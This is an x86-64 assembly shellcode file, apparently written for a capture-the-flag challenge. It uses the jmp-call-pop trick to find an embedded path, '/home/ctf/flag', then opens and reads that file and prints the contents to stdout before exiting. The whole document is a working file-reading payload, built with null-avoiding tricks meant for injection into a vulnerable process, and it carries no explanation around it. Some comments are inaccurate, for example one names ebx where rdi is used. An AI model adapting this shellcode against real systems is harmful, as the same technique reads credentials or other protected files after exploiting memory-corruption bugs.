BITS 64

section  .data              ; declaring our .text segment
global  _start              ; telling where program execution should start

_start:                     ; this is where code starts getting exec'ed
    jmp ed

st:
    pop   rdi               ; pop string's address to ebx 
    xor   rax, rax
    mov   [rdi+0xe], al
    xor   rsi, rsi
    xor   rdx, rdx
    mov   al,0x2            ; open(
    syscall                 ; );

    mov   rdi,rax           ;   file_descriptor,
    xor   rax, rax          ; read(
    sub   rsp,0x50          ;   allocate a space for buffer  
    push  rsp               ;   push buffer's address to stack
    pop   rsi               ;   *buf,
    mov   dl,0x50           ;   *bufsize
    syscall                 ; );

    ; write to STDOUT
    mov   rdx, rax
    mov   al,0x1            ; write(
    mov   dil,0x1           ;   STDOUT,
    syscall                 ; );

    mov al, 60
    syscall

ed:
    call st
    db '/home/ctf/flag'
